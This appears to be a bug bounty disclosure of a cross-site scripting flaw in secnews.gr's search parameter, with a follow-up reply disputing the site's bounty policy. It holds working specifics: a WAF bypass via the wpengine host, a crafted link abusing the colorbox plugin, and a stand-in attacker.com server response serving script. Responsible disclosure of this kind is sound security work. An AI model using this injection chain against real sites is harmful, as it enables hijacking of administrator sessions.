  "vulnerability_information": "Overview\n===\nSearch query is inserted into the HTML of the page without proper encoding. Specifically, a single-quote is not html-encoded (albeit escaped, even twice), which allows the attacker to break out of the HTML attribute and inject arbitrary tags.\n\n```html\ncurl -s 'https://www.secnews.gr?s=%27%3E%3Ctest%3E%3C' | egrep -o \".{47}?<test>.*?>\"\n<div id=\"content\" data-currentquery='{\"s\":\"\\\\'><test><\"}' class=\"main-content articles list sidebar-right    non-full\">\n```\n\nImpediments\n===\nAlthough aformentioned injection point can be used to carry out XSS attacks, there is a couple of complications.\n\n1. The website is protected by the CloudFlare WAF which blocks any suspicious requests. This can be circumvented though by instead targeting `secnews.wpengine.com`.\n2. The website has `X-XSS-Protection` header set which enables very powerful XSS Auditor in Google Chrome.\n3. The potential victim is administrator on a web security website. They are likely to have some kind of an XSS protection plugin installed in their browser.\n\nSolution\n===\nOne of the javascript plugins (colorbox) used by the website has a code path that inserts response from arbitrary URL into DOM tree. It allows the attacker to go from regular XSS to DOM based XSS that anti-XSS tools are not able to detect.\n\nSee a proof-of-concept video: F119742\n\n1. The attacker lures the victim to visit this link:\n    ```\n    https://www.secnews.gr/?s=%27%20class%3Dcolorbox%20href=/attacker.com:9999%3E\n    ```\n\n2. To any incoming requests the server at `attacker.com:9999` responds with:\n    ```\n    HTTP/1.1 200 OK\n    content-length: 39\n    access-control-allow-origin: *\n    access-control-allow-headers: x-requested-with\n    \n    <script>alert(document.domain)</script>\n    ```\n\n3. The victim clicks anywhere below the navigation bar.\n4. Malicious script gets downloaded and executed.\n\nSecurity Implications\n===\nAlthough this exploit requires the victim to click, I'm confident (and hope you are too) that it's only a question of time and effort to find a code path that executes injected script without user interaction.\n\nYou mention in the policy that you don't consider any XSS significant enough for bounty. Although I think that you underestimate the power of XSS, it's your call and I've had a lot of fun anyway.\n\n\n\n",

The thing is that the policy text doesn't say that you are \"not interested for XSS vulnerabilities at all\". It does say that you don't pay money for it, but that's all it says.\n\nIn general it's better to be more explicit about what kinds of bugs you want researchers to submit. If XSS is out of scope (which is very unusual) then make sure you say so in the policy. If you're only interested in severe vulnerabilities then explicitly state it in the policy, not in the automatic response. Let's value each other's time.\n\nQuick comment about severity of XSS. I'm not sure if I need to tell you this, but XSS can be used to compromise website and expose sensitive data. You don't necessarily need to combine it with other attacks. Via XSS you can perform any actions on behalf of the victim account, including upload shells.",
